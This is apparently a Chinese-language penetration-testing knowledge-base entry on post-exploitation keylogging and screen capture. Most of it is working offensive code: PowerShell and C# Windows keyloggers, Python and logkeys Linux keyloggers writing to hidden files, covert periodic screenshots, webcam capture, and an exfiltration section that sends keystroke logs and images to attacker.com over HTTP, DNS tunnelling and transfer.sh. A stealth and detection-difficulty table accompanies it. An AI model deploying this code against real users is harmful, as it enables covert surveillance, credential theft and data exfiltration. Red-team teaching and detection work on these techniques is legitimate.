---
id: 05-002
title: "⌨️ 键盘记录与屏幕捕获 (Keylogging & Screen Capture)"
category: 后渗透
category_en: Post-Exploitation
difficulty: ★★★
tools: "Powershell Keylogger, Python pynput, Metasploit post模块"
last_updated: 2025-07
tags: ["post-exploitation", "credential-access", "data-exfiltration", "remote-control"]
subdomain: post-exploitation
nist_csf: ["PR.AC-01", "PR.DS-05"]
mitre_attack: ["T1003", "T1555", "T1055", "T1021"]
---
# ⌨️ 键盘记录与屏幕捕获 (Keylogging & Screen Capture)

## 概述
在被控系统上记录键盘输入和捕获屏幕画面，获取用户凭证、通信内容等敏感信息。是后渗透阶段最常用的信息收集手段之一。

## 核心技能

### 1. Windows键盘记录

```powershell
# PowerShell Keylogger (纯内存运行)
$keylogger = @'
[DllImport("user32.dll")]
public static extern int GetAsyncKeyState(int vKey);
'@
$type = Add-Type -MemberDefinition $keylogger -Name "KeyState" -Namespace "Win32" -PassThru
while ($true) {
    Start-Sleep -Milliseconds 50
    for ($i = 8; $i -le 255; $i++) {
        if ($type::GetAsyncKeyState($i) -band 0x0001) {
            $key = [char]$i
            Write-Host -NoNewline $key
            # 追加到日志文件
            Add-Content -Path "$env:TEMP\key.log" -Value $key
        }
    }
}
# 记录到文件
powershell -WindowStyle Hidden -File keylogger.ps1
'

# 使用SetWindowsHookEx (底层键盘钩子)
Add-Type -TypeDefinition @'
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

public class LowLevelKeyboardHook {
    private static IntPtr _hookId = IntPtr.Zero;
    private static LowLevelKeyboardProc _proc = HookCallback;

    public static void Start() {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule) {
            _hookId = SetWindowsHookEx(WH_KEYBOARD_LL, _proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
            int vkCode = Marshal.ReadInt32(lParam);
            string log = $"[{DateTime.Now:HH:mm:ss}] Key: {(Keys)vkCode}\n";
            System.IO.File.AppendAllText($"{Environment.GetEnvironmentVariable("TEMP")}\\klog.txt", log);
        }
        return CallNextHookEx(_hookId, nCode, wParam, lParam);
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    const int WH_KEYBOARD_LL = 13;
    const int WM_KEYDOWN = 0x0100;

    [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string lpModuleName);
}
'@

[LowLevelKeyboardHook]::Start()
```

### 2. Linux键盘记录

```bash
# 使用Python pynput
python3 -c "
from pynput import keyboard
import datetime

def on_press(key):
    try:
        with open('/tmp/.keylog', 'a') as f:
            f.write(f'[{datetime.datetime.now()}] {key.char}')
    except AttributeError:
        with open('/tmp/.keylog', 'a') as f:
            f.write(f'[{datetime.datetime.now()}] {key}')

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
" &

# 使用logkeys (需编译)
sudo logkeys --start --output /tmp/.log.log

# 使用showkey (简易)
showkey > /tmp/.keylog &
```

### 3. Windows屏幕捕获

```powershell
# PowerShell截图 (抓取全屏)
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$screen = [System.Windows.Forms.Screen]::PrimaryScreen
$bounds = $screen.Bounds
$bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
$bitmap.Save("$env:TEMP\screen_$(Get-Date -Format 'yyyyMMdd_HHmmss').png", [System.Drawing.Imaging.ImageFormat]::Png)
$graphics.Dispose()
$bitmap.Dispose()

# 定时截图
while ($true) {
    $bitmap = [System.Drawing.Bitmap]::new([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,
        [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
    $path = "$env:USERPROFILE\Pictures\$(Get-Date -Format 'yyyyMMdd_HHmmss').jpg"
    $bitmap.Save($path, [System.Drawing.Imaging.ImageFormat]::Jpeg)
    Start-Sleep -Seconds 30
}

# 使用C#实现隐蔽截图
$csharpCode = @'
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.IO;

public class ScreenCapture {
    [DllImport("user32.dll")]
    private static extern IntPtr GetDesktopWindow();
    [DllImport("gdi32.dll")]
    private static extern bool BitBlt(IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
    [DllImport("user32.dll")]
    private static extern IntPtr GetDC(IntPtr hWnd);
    [DllImport("user32.dll")]
    private static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

    public static void Capture(string path) {
        var bounds = System.Windows.Forms.Screen.PrimaryScreen.Bounds;
        using (var bitmap = new Bitmap(bounds.Width, bounds.Height)) {
            using (var g = Graphics.FromImage(bitmap)) {
                g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
            }
            bitmap.Save(path, ImageFormat.Jpeg);
        }
    }
}
'@
```

### 4. WebCam捕获

```powershell
# PowerShell调用摄像头
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# 使用Windows Media Capture API
$webcam_script = @'
using System;
using System.Drawing;
using System.Windows.Forms;
using System.Runtime.InteropServices;

public class WebCamCapture {
    private const int WM_CAP_CONNECT = 0x040A + 10;
    private const int WM_CAP_GRAB_FRAME = 0x040A + 60;
    private const int WM_CAP_COPY = 0x040A + 65;
    private const int WM_CAP_DRIVER_CONNECT = 0x040A + 10;
    private const int WM_CAP_DRIVER_DISCONNECT = 0x040A + 11;

    [DllImport("avicap32.dll")]
    private static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int x, int y, int nWidth, int nHeight, IntPtr hWndParent, int nID);

    [DllImport("user32.dll")]
    private static extern bool SendMessage(IntPtr hWnd, int wMsg, int wParam, int lParam);

    public static void Capture(string path) {
        IntPtr hWnd = capCreateCaptureWindowA("WebCam", 0, 0, 0, 320, 240, IntPtr.Zero, 0);
        SendMessage(hWnd, WM_CAP_DRIVER_CONNECT, 0, 0);
        SendMessage(hWnd, WM_CAP_GRAB_FRAME, 0, 0);
        SendMessage(hWnd, WM_CAP_COPY, 0, 0);
        SendMessage(hWnd, WM_CAP_DRIVER_DISCONNECT, 0, 0);
        if (Clipboard.ContainsImage()) {
            var img = Clipboard.GetImage();
            img.Save(path, System.Drawing.Imaging.ImageFormat.Jpeg);
        }
    }
}
'@
```

### 5. Linux屏幕捕获

```bash
# 使用scrot
scrot -q 80 /tmp/.$(date +%s).png

# 定时截屏
while true; do
    import -window root /tmp/.$(date +%s).png 2>/dev/null || \
    screencapture -x /tmp/.$(date +%s).png 2>/dev/null || \
    scrot -q 80 /tmp/.$(date +%s).png
    sleep 30
done &

# 使用xwd (X Window)
xwd -root -out /tmp/.screen.xwd
convert /tmp/.screen.xwd /tmp/.screen.png

# 使用ffmpeg录制屏幕
ffmpeg -f x11grab -s 1920x1080 -i :0.0 -frames:v 1 /tmp/.desktop.png
```

## 隐蔽性对比

| 技术 | 进程可见 | 文件占用 | 网络外传 | 检测难度 |
|:---|:---:|:---:|:---:|:---:|
| PowerShell Keylogger | 是 | 否(内存) | 需额外 | 中 |
| SetWindowsHookEx | DLL注入 | 否(内存) | 需额外 | 高 |
| Python pynput | python进程 | 否(内存) | 需额外 | 中 |
| logkeys | 是 | 日志文件 | 需额外 | 低 |
| WinAPI截图 | 是 | 图片文件 | HTTP/FTP | 中 |
| WebCam捕获 | DLL | 图片文件 | HTTP | 高 |

## 数据外传策略

```bash
# 1. HTTP POST上传
curl -s -F "file=@screen.png" http://attacker.com/upload

# 2. 分段DNS外传
cat key.log | base64 | while read line; do
    host ${line:0:32}.exfil.attacker.com
done

# 3. 隐写术外传
# 将日志嵌入到图片中
steghide embed -cf legitimate.jpg -ef key.log -p password123

# 4. 利用云服务
curl -s -X PUT -T key.log https://transfer.sh/key.log
```

## 常用工具

| 工具 | 用途 | 链接 |
|:---|:---|:---|
| Metasploit post/windows/capture/keylog_recorder | Windows键盘记录 | https://www.metasploit.com/ |
| Python pynput | 跨平台键盘/鼠标监听 | https://github.com/moses-palmer/pynput |
| logkeys | Linux键盘记录 | https://github.com/kernc/logkeys |
| SharpCapture | 屏幕捕获工具 | https://github.com/GhostPack/SharpCapture |
| ffmpeg | 屏幕录制 | https://ffmpeg.org/ |

## 参考资源

- [MITRE ATT&CK — Input Capture (T1056)](https://attack.mitre.org/techniques/T1056/)
- [MITRE ATT&CK — Screen Capture (T1113)](https://attack.mitre.org/techniques/T1113/)
- [HackTricks — Keylogging](https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/keylogging)
